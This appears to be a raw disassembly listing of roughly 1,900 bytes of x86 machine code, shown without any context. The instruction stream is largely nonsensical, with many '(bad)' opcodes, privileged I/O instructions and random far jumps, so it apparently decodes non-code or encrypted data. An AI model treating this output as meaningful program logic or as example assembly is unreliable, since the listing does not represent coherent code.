  405f94:	mov    dl,0x9e
  405f96:	mov    dl,0x38
  405f98:	xchg   edx,eax
  405f99:	pop    eax
  405f9a:	mov    edx,0x2ab9a23f
  405f9f:	repnz imul ecx
  405fa2:	stos   DWORD PTR es:[edi],eax
  405fa3:	push   edi
  405fa4:	sbb    al,0x2e
  405fa6:	ret    
  405fa7:	test   al,0xaa
  405fa9:	js     0x405f48
  405fab:	div    DWORD PTR ds:0xcb7cf9b6
  405fb1:	mov    bh,0x6b
  405fb3:	push   ds
  405fb4:	or     BYTE PTR [eax],dh
  405fb6:	or     cl,cl
  405fb8:	push   cs
  405fb9:	int    0x7b
  405fbb:	sub    al,0x42
  405fbd:	pop    edi
  405fbe:	popa   
  405fbf:	xor    eax,0x6300316d
  405fc4:	cwde   
  405fc5:	xchg   DWORD PTR [eax],esp
  405fc7:	cli    
  405fc8:	xchg   edi,eax
  405fc9:	mov    bl,0xe9
  405fcb:	(bad)  
  405fcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fcd:	imul   esi,esi,0xddf2bf6c
  405fd3:	(bad)  
  405fd4:	jge    0x405f5a
  405fd6:	inc    ebx
  405fd7:	sahf   
  405fd8:	cs cdq 
  405fda:	push   cs
  405fdb:	mov    ds:0x62c50871,al
  405fe0:	pop    ebx
  405fe1:	cmp    DWORD PTR [esp+esi*2-0x1f5d9a4a],ecx
  405fe8:	push   edi
  405fe9:	ds push ds
  405feb:	gs push ebp
  405fed:	adc    dh,BYTE PTR [ecx]
  405fef:	addr16 retf 0x5514
  405ff3:	xchg   ebx,eax
  405ff4:	xchg   bh,cl
  405ff6:	aas    
  405ff7:	xchg   edi,eax
  405ff8:	and    ah,BYTE PTR ds:0x43c7ccfa
  405ffe:	sbb    eax,0x1fb5d20a
  406003:	loope  0x40606e
  406005:	int    0xc
  406007:	aad    0x94
  406009:	mov    bl,0x4b
  40600b:	out    dx,al
  40600c:	daa    
  40600d:	push   edx
  40600e:	xchg   edi,eax
  40600f:	stc    
  406010:	xor    al,0x97
  406012:	cld    
  406013:	inc    edi
  406014:	lods   eax,DWORD PTR ds:[esi]
  406015:	adc    al,0x56
  406017:	retf   0x156b
  40601a:	rcl    DWORD PTR [eax+0x71],0x24
  40601e:	add    DWORD PTR [ebx+0x2c1765ff],ebx
  406024:	xor    ebp,DWORD PTR [ebx-0x148c2ec7]
  40602a:	iret   
  40602b:	push   eax
  40602c:	push   es
  40602d:	aas    
  40602e:	jns    0x406019
  406030:	sub    eax,0xff3caaa1
  406035:	jmp    0x406025
  406037:	dec    edx
  406038:	sbb    ch,BYTE PTR [ecx+0x18]
  40603b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40603c:	jle    0x405ff5
  40603e:	pop    esp
  40603f:	cld    
  406040:	mov    edx,0x4fbe79c3
  406045:	in     al,0xaf
  406047:	stos   BYTE PTR es:[edi],al
  406048:	lods   eax,DWORD PTR ds:[esi]
  406049:	pop    ebx
  40604a:	(bad)  
  40604b:	ficomp DWORD PTR [ebx+0x20]
  40604e:	aaa    
  40604f:	daa    
  406050:	jne    0x4060c6
  406052:	fs leave 
  406054:	(bad)  
  406056:	adc    ch,ah
  406058:	pop    edi
  406059:	jns    0x406010
  40605b:	cdq    
  40605c:	(bad)  
  40605d:	lds    ebx,FWORD PTR [edi+ebp*2-0x3334f026]
  406064:	arpl   WORD PTR [esi],sp
  406066:	lahf   
  406067:	xchg   ebp,eax
  406068:	or     ebx,DWORD PTR [ebx+ecx*1]
  40606b:	xlat   BYTE PTR ds:[ebx]
  40606c:	xchg   esp,eax
  40606d:	repz (bad) 
  40606f:	sti    
  406070:	xchg   ecx,eax
  406071:	xor    BYTE PTR [ebx-0x4a],dh
  406074:	cmp    BYTE PTR [esi+ebx*2-0x3b],bh
  406078:	xchg   DWORD PTR [esi+esi*4-0x7f495d15],esi
  40607f:	shl    BYTE PTR [ebx],0xff
  406082:	push   ebp
  406083:	lahf   
  406084:	inc    eax
  406085:	dec    BYTE PTR [edi]
  406087:	add    dh,BYTE PTR [edx]
  406089:	dec    esi
  40608a:	and    eax,0xd55963e6
  40608f:	loopne 0x4060e3
  406091:	shr    DWORD PTR [eax],0xac
  406094:	pop    edi
  406095:	sub    BYTE PTR [esi],ch
  406097:	or     DWORD PTR [ebp+0x15],edx
  40609a:	or     al,0xb1
  40609c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40609d:	adc    al,0x72
  40609f:	sbb    ebp,ebp
  4060a1:	mov    dh,0x8c
  4060a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060a4:	and    ecx,ecx
  4060a6:	cmp    al,0x2b
  4060a8:	or     ah,BYTE PTR [ebp-0x54]
  4060ab:	push   esp
  4060ac:	call   0x68df:0x2316bd23
  4060b3:	mov    BYTE PTR [ecx+eiz*4+0x2cd318ab],dh
  4060ba:	pop    ss
  4060bb:	es call 0x9306d13d
  4060c1:	inc    ecx
  4060c2:	xchg   edx,eax
  4060c3:	adc    BYTE PTR [esi+0x4e],dl
  4060c6:	fdiv   DWORD PTR [ebp-0x2d]
  4060c9:	fwait
  4060ca:	sub    BYTE PTR [ebx+0x4e],al
  4060cd:	mov    al,0xdc
  4060cf:	push   edi
  4060d0:	cld    
  4060d1:	mov    al,0x9b
  4060d3:	imul   ebp,DWORD PTR [eax],0xa954a320
  4060d9:	pop    eax
  4060da:	and    DWORD PTR [edx-0x2a],ebx
  4060dd:	ins    BYTE PTR es:[edi],dx
  4060de:	sbb    DWORD PTR [edx-0x146e8cb8],ecx
  4060e4:	popf   
  4060e5:	dec    edi
  4060e6:	pop    es
  4060e7:	sbb    edx,edx
  4060e9:	arpl   WORD PTR [eax],cx
  4060eb:	pop    edx
  4060ec:	mov    esi,0xc19adeeb
  4060f1:	into   
  4060f2:	imul   edx,DWORD PTR [ecx+0x2a],0xa05750a8
  4060f9:	pop    es
  4060fa:	call   0x3b8a4f3
  4060ff:	dec    esi
  406100:	stos   BYTE PTR es:[edi],al
  406101:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406102:	dec    ebx
  406103:	pop    es
  406104:	in     al,0x55
  406106:	js     0x40616a
  406108:	push   esi
  406109:	xchg   ebx,eax
  40610a:	inc    edx
  40610b:	dec    esi
  40610c:	or     esp,DWORD PTR [edi+ebx*1-0x594ca6b0]
  406113:	cmp    al,0xb2
  406115:	xor    DWORD PTR [esi+edx*1+0x3267ae70],ebx
  40611c:	and    eax,0xd4dd69e4
  406121:	loop   0x406162
  406123:	pushf  
  406124:	leave  
  406125:	aad    0xf
  406127:	dec    ebp
  406128:	fadd   QWORD PTR [ebp-0x305c3156]
  40612e:	jbe    0x406118
  406130:	jo     0x40610f
  406132:	dec    esp
  406133:	adc    BYTE PTR [ebp+0x1],bh
  406136:	mov    bh,0xda
  406138:	scas   al,BYTE PTR es:[edi]
  406139:	sub    eax,0x5cfebfef
  40613e:	mov    BYTE PTR [ecx],dl
  406140:	mov    esi,0xc6fd5e73
  406145:	pop    es
  406146:	ret    0xc45d
  406149:	cmp    BYTE PTR [edx],cl
  40614b:	push   edi
  40614c:	dec    edx
  40614d:	sbb    dh,BYTE PTR [ecx-0x7f55494b]
  406153:	dec    ecx
  406154:	es in  al,0xea
  406157:	daa    
  406158:	inc    edx
  406159:	inc    edi
  40615a:	jno    0x40610b
  40615c:	aad    0x21
  40615e:	and    DWORD PTR [esp+ecx*8],ecx
  406161:	adc    al,0xaf
  406163:	cmp    al,0x52
  406165:	call   0x73e2:0xa7b8f29c
  40616c:	clc    
  40616d:	ja     0x406147
  40616f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406170:	dec    esp
  406171:	mov    ds:0xdc689099,eax
  406176:	xchg   ebx,eax
  406177:	fmul   QWORD PTR gs:[ecx+0x3d]
  40617b:	cmp    DWORD PTR [edx+0x0],eax
  40617e:	xchg   ecx,eax
  40617f:	jns    0x406110
  406181:	push   edi
  406183:	dec    ebx
  406184:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406185:	inc    ebp
  406186:	ds (bad) 
  406188:	mov    eax,0x19abf815
  40618d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40618e:	stos   DWORD PTR es:[edi],eax
  40618f:	loope  0x40620d
  406191:	xchg   ebp,eax
  406192:	mov    ch,0x38
  406194:	movups xmm6,xmm1
  406197:	icebp  
  406198:	fild   QWORD PTR [ecx+ebp*1]
  40619b:	mov    DWORD PTR [ebx+0x6a],ebx
  40619e:	add    edi,DWORD PTR [eax+esi*1+0x6c8e3ae4]
  4061a5:	shl    DWORD PTR [ebx],cl
  4061a7:	test   eax,eax
  4061a9:	push   ss
  4061aa:	int    0x39
  4061ac:	inc    eax
  4061ad:	adc    eax,0x4af150a5
  4061b2:	pop    eax
  4061b3:	shr    DWORD PTR [ebp+0x36245cd9],1
  4061b9:	sub    BYTE PTR [edi-0x1129527a],cl
  4061bf:	add    ebp,esi
  4061c1:	push   es
  4061c2:	mov    WORD PTR [ebx],?
  4061c4:	push   0xffffffd8
  4061c6:	iret   
  4061c7:	fwait
  4061c8:	addr16 cld 
  4061ca:	hlt    
  4061cb:	mov    fs,ecx
  4061cd:	dec    ebp
  4061ce:	push   edi
  4061cf:	lahf   
  4061d0:	jge    0x406211
  4061d2:	scas   al,BYTE PTR es:[edi]
  4061d3:	jbe    0x8b3311a3
  4061d9:	sbb    al,0xb7
  4061db:	dec    edi
  4061dc:	ja     0x40619e
  4061de:	mov    ecx,0x217fb3ba
  4061e3:	inc    DWORD PTR [edi+0x7eef89be]
  4061e9:	mov    DWORD PTR [eax-0x16],esp
  4061ec:	loop   0x4061cf
  4061ee:	dec    ebx
  4061ef:	mov    bl,0x6c
  4061f1:	je     0x4061d1
  4061f3:	mov    DWORD PTR [bp-0x55],esi
  4061f7:	mov    cl,BYTE PTR [ebx]
  4061f9:	mov    ecx,DWORD PTR [esi-0x5b3fc85c]
  4061ff:	mov    ecx,0x3d60ad90
  406204:	loopne 0x406209
  406206:	push   esp
  406207:	test   BYTE PTR [ebx+0x612e94bb],bh
  40620d:	push   ds
  40620e:	sbb    BYTE PTR [ebp-0x79],dh
  406211:	scas   eax,DWORD PTR es:[edi]
  406212:	sti    
  406213:	ins    BYTE PTR es:[edi],dx
  406214:	pop    ebp
  406216:	dec    esi
  406217:	mov    bh,0x62
  406219:	stos   DWORD PTR es:[edi],eax
  40621a:	loop   0x406267
  40621c:	in     al,dx
  40621d:	jecxz  0x4061b6
  40621f:	out    dx,al
  406220:	inc    ecx
  406221:	adc    DWORD PTR ds:0x9800c0dc,eax
  406227:	pop    ecx
  406228:	ss aaa 
  40622a:	inc    eax
  40622b:	or     BYTE PTR [eax+0xbb2a335],ah
  406231:	aas    
  406232:	lds    esp,FWORD PTR [edx+0x1d2b737b]
  406238:	rcl    DWORD PTR [ebx],0x7d
  40623b:	xor    ch,BYTE PTR [ebp-0x78]
  40623e:	repz jmp 0x4061da
  406241:	in     al,dx
  406242:	xchg   esp,eax
  406243:	mov    ecx,0x3a7077fc
  406248:	imul   edx,DWORD PTR [edi],0x4b
  40624b:	sbb    BYTE PTR [esi],dl
  40624d:	mov    BYTE PTR [ebx-0x5ad32b6b],al
  406253:	pop    esi
  406254:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406255:	test   eax,0xb0448958
  40625a:	sti    
  40625b:	pop    esi
  40625c:	mov    BYTE PTR [ebp+0x2e4c59b5],dl
  406262:	cwde   
  406263:	mov    eax,ds:0xff813900
  406268:	out    dx,al
  406269:	mov    al,0xd7
  40626b:	outs   dx,BYTE PTR ds:[esi]
  40626c:	sub    DWORD PTR [edx+0x55f31f7c],0x25
  406273:	je     0x40625c
  406275:	jmp    0xd702:0xc4739284
  40627c:	mov    ah,0x21
  40627e:	xlat   BYTE PTR ds:[ebx]
  40627f:	sub    DWORD PTR [ebx],0x15c299d7
  406285:	into   
  406286:	mov    cl,0x7f
  406288:	fimul  DWORD PTR [ebp-0x7e3f1982]
  40628e:	adc    eax,0xe76b8cc1
  406293:	ja     0x40621d
  406295:	pop    esi
  406296:	push   ecx
  406297:	jno    0x406258
  406299:	(bad)  
  40629a:	xchg   edi,eax
  40629b:	mov    eax,0x311490f5
  4062a0:	aas    
  4062a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4062a2:	int3   
  4062a3:	imul   edi,DWORD PTR [edi+0x39],0x42d8ca71
  4062aa:	jge    0x4062d6
  4062ac:	out    0xf8,al
  4062ae:	push   edx
  4062af:	jmp    0x406323
  4062b1:	sbb    bl,BYTE PTR [edx-0x6a609c62]
  4062b7:	push   ss
  4062b8:	dec    ecx
  4062b9:	fs pop eax
  4062bb:	xchg   eax,eax
  4062bd:	xor    BYTE PTR [esi+0x79],al
  4062c0:	jae    0x40628c
  4062c2:	stos   DWORD PTR es:[edi],eax
  4062c3:	fnstenv [ebp+0x30da338a]
  4062c9:	cmc    
  4062ca:	hlt    
  4062cb:	cs std 
  4062cd:	mov    edx,0x643a579d
  4062d2:	cmp    dl,bh
  4062d4:	push   ebp
  4062d5:	mov    dh,0x2d
  4062d7:	xchg   edi,eax
  4062d8:	icebp  
  4062d9:	mov    esi,0xfc302ab1
  4062de:	jp     0x4062ae
  4062e0:	xchg   edx,eax
  4062e1:	js     0x40626d
  4062e3:	push   ebx
  4062e4:	jge    0x406305
  4062e6:	fdivr  DWORD PTR ds:0x84f76a6
  4062ec:	and    dl,BYTE PTR [edx-0x68]
  4062ef:	pushf  
  4062f0:	inc    ecx
  4062f1:	xchg   DWORD PTR [ecx+0x165904e4],eax
  4062f7:	xchg   esp,eax
  4062f8:	ins    DWORD PTR es:[edi],dx
  4062f9:	jno    0x4062a8
  4062fb:	jbe    0x4062e5
  4062fd:	ins    BYTE PTR es:[edi],dx
  4062fe:	sub    eax,DWORD PTR [ebp+0x1d]
  406301:	adc    eax,0xa9ab4a60
  406306:	mov    esp,0x1d4a731
  40630b:	mov    gs:0xf57c6d80,al
  406311:	or     ch,cl
  406313:	pop    ebp
  406314:	dec    ecx
  406315:	sub    bh,0x7f
  406318:	jmp    0x406334
  40631a:	fcomp  QWORD PTR [ebx+0xa]
  40631d:	mov    edx,0x5974a3b3
  406322:	ds popf 
  406324:	sub    BYTE PTR [edx+0x113e9e17],0x82
  40632b:	mov    DWORD PTR ds:[ebp+0x52ea701],ecx
  406332:	push   eax
  406333:	ss fwait
  406335:	inc    edx
  406336:	ja     0x406318
  406338:	test   BYTE PTR [esi+0x6a2ddf8f],0x5c
  40633f:	sub    dh,BYTE PTR [ecx]
  406341:	fst    DWORD PTR [ebx]
  406343:	scas   al,BYTE PTR es:[edi]
  406344:	jb     0x4063aa
  406346:	loope  0x4063a1
  406348:	sbb    bh,dl
  40634a:	and    bh,BYTE PTR [ebx+0x7e80b225]
  406350:	cmovno ebx,DWORD PTR [esi+eax*8-0x499da6f4]
  406358:	imul   eax,DWORD PTR [ebx],0xffffffb4
  40635b:	sub    ebx,DWORD PTR [edi+eax*4-0x16]
  40635f:	xchg   esp,eax
  406360:	xchg   edx,eax
  406361:	cdq    
  406362:	(bad)  
  406363:	dec    edx
  406364:	sbb    al,dl
  406366:	mov    BYTE PTR [ebp+0x7f33732a],cl
  40636c:	add    BYTE PTR [edx],bl
  40636e:	pop    ebx
  40636f:	sbb    BYTE PTR [ebp-0x2b],ah
  406372:	push   edx
  406373:	add    al,0x10
  406375:	pop    eax
  406376:	jl     0x4063d5
  406378:	xchg   edx,eax
  406379:	xchg   edi,eax
  40637a:	push   esi
  40637b:	xor    ah,BYTE PTR [edi-0x10]
  40637e:	xor    al,0x21
  406380:	shr    DWORD PTR [ebx],cl
  406382:	push   0x18d38ba7
  406387:	out    dx,al
  406388:	loopne 0x406321
  40638a:	sar    edi,1
  40638c:	dec    edx
  40638d:	test   al,0xb
  40638f:	mov    bl,0x51
  406391:	mov    ah,0xac
  406393:	mov    al,0x3c
  406395:	cmc    
  406396:	push   ebx
  406397:	cwde   
  406398:	dec    esi
  406399:	dec    esi
  40639a:	out    0x5b,eax
  40639c:	mov    edx,edx
  40639e:	fld    TBYTE PTR [ebp-0x328c9fde]
  4063a4:	pop    ds
  4063a5:	jge    0x4063ab
  4063a7:	mov    edx,?
  4063a9:	popa   
  4063aa:	mov    ds:0x202718e9,eax
  4063af:	sbb    dh,BYTE PTR [edi+ebx*8-0x1d]
  4063b3:	inc    edx
  4063b4:	test   eax,0xf453899d
  4063b9:	push   ebp
  4063ba:	dec    edi
  4063bb:	jns    0x4063a1
  4063bd:	and    edx,DWORD PTR [eax]
  4063bf:	sbb    bl,BYTE PTR [esi-0x14]
  4063c2:	std    
  4063c3:	xor    BYTE PTR [eax+ebp*4+0x59067f81],bh
  4063ca:	jo     0x406359
  4063cc:	and    al,0x16
  4063ce:	jge    0x4063aa
  4063d0:	adc    DWORD PTR [ebx],edi
  4063d2:	shl    bl,1
  4063d4:	adc    bh,BYTE PTR [esi+0x50b203ea]
  4063da:	in     al,dx
  4063db:	stos   DWORD PTR es:[edi],eax
  4063dc:	sbb    ch,cl
  4063de:	pminsw mm1,QWORD PTR [edx]
  4063e1:	imul   edi,eax,0x45
  4063e4:	jle    0x4063a1
  4063e6:	push   ecx
  4063e7:	sub    DWORD PTR [ecx+0x78b7fe77],ebp
  4063ed:	or     eax,0xde5efa69
  4063f2:	mov    ebp,0xd211d6b0
  4063f7:	pop    eax
  4063f8:	retf   
  4063f9:	(bad)  
  4063fa:	sub    al,0x6e
  4063fc:	aas    
  4063fd:	mov    cl,0xb2
  4063ff:	outs   dx,BYTE PTR ds:[esi]
  406400:	dec    ebp
  406401:	add    eax,0x966b1fae
  406406:	fld    QWORD PTR [esi]
  406408:	aam    0x83
  40640a:	xchg   esp,eax
  40640b:	fs in  eax,0x6e
  40640e:	sbb    esp,DWORD PTR [ebx+ebx*8-0x50]
  406412:	lods   eax,DWORD PTR ds:[esi]
  406413:	pop    ebx
  406414:	push   esi
  406415:	cmp    ch,ah
  406417:	dec    ecx
  406418:	scas   al,BYTE PTR es:[edi]
  406419:	sub    DWORD PTR [esi+eax*4],esp
  40641c:	push   edi
  40641d:	push   edi
  40641e:	jecxz  0x40648b
  406420:	mov    BYTE PTR [esi+0x7e],bh
  406423:	jne    0x4063e9
  406425:	(bad)
  406429:	jno    0x406439
  40642b:	cmp    eax,0xbb30cabc
  406430:	das    
  406431:	sahf   
  406432:	sar    DWORD PTR [ebp+0x62],cl
  406435:	(bad)  
  406436:	int    0xc2
  406438:	adc    edi,esi
  40643a:	mov    ds:0x852517a8,eax
  40643f:	or     dh,ch
  406441:	pop    ebp
  406442:	cmp    DWORD PTR [ebx-0x52d917c1],eax
  406448:	dec    ebp
  406449:	xchg   edx,eax
  40644a:	dec    ebx
  40644b:	add    al,BYTE PTR [esp+ecx*1-0x7676cd14]
  406452:	pop    es
  406453:	mov    al,0xcb
  406455:	sbb    al,0x25
  406457:	or     dh,BYTE PTR [ecx-0x5280056e]
  40645d:	imul   ecx,DWORD PTR [eax],0x63
  406460:	pop    edi
  406461:	inc    ebx
  406462:	pop    ss
  406463:	pop    edx
  406464:	cs popf 
  406466:	push   edi
  406467:	getsec 
  406469:	scas   eax,DWORD PTR es:[edi]
  40646a:	aas    
  40646b:	fsub   QWORD PTR [ecx]
  40646d:	out    0xdc,eax
  40646f:	pop    esp
  406470:	lods   al,BYTE PTR ds:[esi]
  406471:	(bad)  
  406472:	aaa    
  406473:	mov    ch,BYTE PTR [esi]
  406475:	repnz fisubr WORD PTR [edi+0x20]
  406479:	jmp    0xeb21:0xc71b4031
  406480:	xchg   esi,eax
  406482:	cli    
  406483:	fwait
  406484:	push   0xffffff89
  406486:	into   
  406487:	aam    0xb5
  406489:	aad    0xbc
  40648b:	lock jge 0x4064ed
  40648e:	pop    edx
  40648f:	js     0x406500
  406491:	test   BYTE PTR cs:[eax-0x5f138a73],bh
  406498:	pushf  
  406499:	adc    ah,dl
  40649b:	and    al,0x19
  40649d:	and    al,0xb8
  40649f:	inc    ecx
  4064a0:	mov    eax,DWORD PTR [ebp+0x54]
  4064a3:	scas   eax,DWORD PTR es:[edi]
  4064a4:	(bad)  
  4064a6:	sti    
  4064a7:	xchg   ebp,eax
  4064a8:	aas    
  4064a9:	sbb    eax,0x928c50cb
  4064ae:	(bad)  
  4064b0:	jg     0x4064a0
  4064b2:	pop    esp
  4064b3:	in     al,dx
  4064b4:	xor    al,ah
  4064b6:	out    0x6a,al
  4064b8:	push   es
  4064b9:	add    eax,0xec83ff36
  4064be:	sbb    DWORD PTR ds:0x24aa7a23,edi
  4064c4:	xor    BYTE PTR [ebp-0x663da01b],bh
  4064ca:	sqrtps xmm0,XMMWORD PTR [ebx+0x48ae2dfe]
  4064d1:	enter  0x27da,0x6
  4064d5:	shr    BYTE PTR [ebx-0x369d2e62],0xc
  4064dc:	imul   ebp,DWORD PTR [esi-0x3a],0xffffffda
  4064e0:	(bad)  
  4064e1:	cli    
  4064e2:	xchg   ecx,eax
  4064e3:	mov    cl,0x92
  4064e5:	add    eax,0xf982dd46
  4064ea:	mov    ds:0xc3fdebdd,al
  4064ef:	jmp    0x34b8:0xd850243f
  4064f6:	es out 0x6d,al
  4064f9:	mov    ecx,eax
  4064fb:	sti    
  4064fc:	mov    edi,0xed48e851
  406501:	es jl  0x406576
  406504:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406505:	addr16 fs push 0x11
  406509:	push   ecx
  40650a:	mov    bl,0x78
  40650c:	push   0x9837c44
  406511:	stos   BYTE PTR es:[edi],al
  406512:	add    esp,DWORD PTR [eax-0x42]
  406515:	cmp    eax,0xc3d764a7
  40651a:	cdq    
  40651b:	aaa    
  40651c:	adc    eax,0x88773f92
  406521:	test   esi,0x143a7fc2
  406527:	jo     0x406593
  406529:	pop    ds
  40652a:	mov    dl,0x42
  40652c:	imul   eax,DWORD PTR [ecx],0x5fd3f3c5
  406532:	aad    0x81
  406534:	adc    BYTE PTR [ebx],ch
  406536:	cli    
  406537:	mov    ah,0x2a
  406539:	inc    ecx
  40653a:	ins    DWORD PTR es:[edi],dx
  40653b:	test   eax,0x758f524c
  406540:	push   edi
  406541:	and    BYTE PTR [eax],bh
  406543:	push   ebx
  406544:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406545:	ret    0xe6b6
  406548:	jle    0x406508
  40654a:	jbe    0x40659f
  40654c:	lods   al,BYTE PTR ds:[esi]
  40654d:	and    esp,DWORD PTR [edx+0xe]
  406550:	mul    DWORD PTR [edx]
  406552:	in     eax,dx
  406553:	loopne 0x40659d
  406555:	stos   BYTE PTR es:[edi],al
  406556:	lods   al,BYTE PTR ds:[esi]
  406557:	ss out 0x71,al
  40655a:	mov    esp,0xaf1a6af3
  40655f:	enter  0x3398,0x50
  406563:	adc    BYTE PTR [ebp+ebx*1+0x36],bl
  406567:	lods   al,BYTE PTR ds:[esi]
  406568:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406569:	and    cl,BYTE PTR [ebx-0x5c]
  40656c:	xchg   BYTE PTR [esi+ebx*2],bl
  40656f:	ins    DWORD PTR es:[edi],dx
  406570:	or     ch,dh
  406572:	pop    esp
  406573:	lds    ebx,FWORD PTR [ecx+eax*2]
  406576:	adc    DWORD PTR [edx-0x11],ebp
  406579:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40657a:	sbb    al,0x6f
  40657c:	jg     0x406569
  40657e:	mov    edx,0x7d708343
  406583:	ss jmp 0x101b:0x8fa0aca2
  40658b:	xchg   esi,eax
  40658c:	scas   al,BYTE PTR es:[edi]
  40658d:	out    dx,eax
  40658e:	push   ds
  40658f:	add    DWORD PTR [edx],0x5c
  406592:	pop    ebp
  406593:	js     0x406569
  406595:	data16 sti 
  406597:	loopne 0x4065f1
  406599:	or     ebp,edi
  40659b:	sub    eax,0x95454015
  4065a0:	cmp    ah,ah
  4065a2:	cld    
  4065a3:	pop    eax
  4065a4:	xchg   ecx,eax
  4065a5:	mov    ch,0x45
  4065a7:	mov    ah,0x88
  4065a9:	stos   BYTE PTR es:[edi],al
  4065aa:	dec    edx
  4065ab:	cmc    
  4065ac:	sub    esi,DWORD PTR [ebp+edi*4+0x11c1c7ca]
  4065b3:	or     dl,BYTE PTR [eax]
  4065b5:	push   ebp
  4065b6:	loopne 0x4065ed
  4065b8:	out    0x39,al
  4065ba:	dec    ebp
  4065bb:	test   DWORD PTR [edx],0x491ad0a8
  4065c1:	int3   
  4065c2:	call   0x92e:0xc6ab3b9a
  4065c9:	jmp    0x40657b
  4065cb:	dec    esp
  4065cc:	je     0x406641
  4065ce:	push   0xfed57f80
  4065d3:	mov    al,0x38
  4065d5:	iret   
  4065d6:	mov    dl,0x69
  4065d8:	add    BYTE PTR [ecx-0x1],bh
  4065db:	scas   eax,DWORD PTR es:[edi]
  4065dc:	rol    DWORD PTR [esi],1
  4065de:	fadd   st,st(5)
  4065e0:	or     BYTE PTR [esi*8-0x68db4d04],dl
  4065e7:	xchg   edx,eax
  4065e8:	adc    cl,cl
  4065ea:	outs   dx,BYTE PTR ds:[esi]
  4065eb:	add    dh,BYTE PTR [ecx-0x75]
  4065ee:	dec    edi
  4065ef:	(bad)  
  4065f1:	and    DWORD PTR [eax-0x21],ebp
  4065f4:	sub    al,0x1d
  4065f6:	sub    BYTE PTR [ebp+0x411245c5],dh
  4065fc:	mov    cs,WORD PTR [esi-0x7e909761]
  406602:	mov    al,0x15
  406604:	pop    ss
  406605:	mov    dh,0x83
  406607:	mov    ebx,0xddcade72
  40660c:	inc    ebx
  40660d:	imul   esp,DWORD PTR [esi-0x3b],0xffffff83
  406611:	mov    esp,0x9c2f5d95
  406616:	inc    ecx
  406617:	jns    0x40662a
  406619:	ins    DWORD PTR es:[edi],dx
  40661a:	push   0xfffffffb
  40661c:	or     BYTE PTR fs:[edi-0x5],al
  406620:	cmp    DWORD PTR [esi+ebx*1],edx
  406623:	mov    ecx,0x4a84f87
  406628:	xchg   edx,eax
  406629:	mov    cl,0x2c
  40662b:	xchg   DWORD PTR [edi+0x702f6ca5],eax
  406631:	sub    eax,0x6198410
  406636:	and    DWORD PTR [esp+edx*4],0x6c31c89f
  40663d:	xchg   ebp,eax
  40663e:	ret    
  40663f:	inc    esi
  406640:	xor    eax,0x5a7023ee
  406645:	add    eax,0x222a600a
  40664a:	fnstcw WORD PTR [eax+eax*1+0x2f]
  40664e:	mov    esi,0x15bff0ae
  406653:	int    0x4f
  406655:	out    0x92,al
  406657:	ret    
  406658:	icebp  
  406659:	fdiv   QWORD PTR [edx-0x6b]
  40665c:	out    0x64,al
  40665e:	mov    DWORD PTR [edi],esi
  406660:	cmp    eax,0x92f3d817
  406665:	lods   eax,DWORD PTR ds:[esi]
  406666:	mov    dl,0x5f
  406668:	mov    edx,0x5441d6b8
  40666d:	loope  0x4066c4
  40666f:	push   esi
  406670:	scas   al,BYTE PTR es:[edi]
  406671:	retf   
  406672:	bswap  ebp
  406674:	mov    cl,0x4d
  406676:	push   cs
  406677:	sub    BYTE PTR [ebp-0x52],bl
  40667a:	les    eax,FWORD PTR [ebp-0x1a]
  40667d:	push   ss
  40667e:	shr    edx,cl
  406680:	mov    ah,0x18
  406682:	lods   eax,DWORD PTR ds:[esi]
  406683:	hlt    
  406684:	sbb    cl,al
  406686:	int    0xcc
  406688:	rcl    DWORD PTR [ecx+edx*4],1
  40668b:	dec    esi
  40668c:	xor    bh,ah
  40668e:	jae    0x4066be
  406690:	jne    0x406615
  406692:	out    0x40,al
  406694:	pop    esi
  406695:	mov    ebx,0x4cc1f036
  40669a:	and    DWORD PTR [ebp-0x6efb5fbc],ebx
  4066a0:	stos   DWORD PTR es:[edi],eax
  4066a1:	xor    al,0x8f
  4066a3:	mov    cl,0x20
  4066a5:	popf   
  4066a6:	stos   BYTE PTR es:[edi],al
  4066a7:	cs (bad) 
  4066a9:	repnz aam 0xbe
  4066ac:	icebp  
  4066ad:	sbb    DWORD PTR [ecx+0xb],esi
  4066b0:	push   edi
  4066b1:	out    0xb,al
  4066b3:	and    ebp,DWORD PTR [edx+0x6d]
  4066b6:	imul   edi,ecx,0xfa399992
  4066bc:	lahf   
  4066bd:	popa   
  4066be:	test   DWORD PTR [ebx],esi
  4066c0:	adc    eax,0x1784e1c4
  4066c5:	pop    edi
  4066c7:	inc    ecx
  4066c8:	in     al,0x37
  4066ca:	in     al,0xc5
  4066cc:	fwait
  4066cd:	sub    esi,DWORD PTR cs:[esi-0x3]
  4066d1:	hlt    
  4066d2:	inc    edi
  4066d3:	ret    0xa836
  4066d6:	adc    ebx,eax
  4066d8:	rcl    BYTE PTR [esi+0x26db308f],cl
  4066de:	push   ss
  4066df:	pop    esp
  4066e0:	jno    0x40667c
  4066e2:	(bad)  
  4066e4:	leave  
  4066e5:	imul   ebp,esp,0xa8884af2
  4066eb:	push   0x18fe47b
  4066f0:	mov    bl,0x1a
  4066f2:	shl    DWORD PTR [ebp-0x76],cl
  4066f5:	(bad)  
  4066f6:	add    al,0xe1
  4066f8:	mov    ebp,0x2ae4dca3
  4066fd:	xchg   DWORD PTR [edi+0x13],ebx
  406700:	xor    al,0x34
  406702:	sub    dl,al
  406704:	stos   DWORD PTR es:[edi],eax
  406705:	add    al,0xfb
  406707:	lds    ecx,FWORD PTR [eax]
  406709:	test   al,0x80
  40670b:	test   al,0xb9
  40670d:	sbb    ecx,ecx
  40670f:	int3   
  406710:	push   ebp
  406711:	popa   
  406712:	jmp    DWORD PTR [ebx+0x55]
  406715:	call   FWORD PTR [edx+0x13]
  406718:	sti    
  406719:	jg     0x40678b
  40671b:	adc    DWORD PTR [edx],ebp
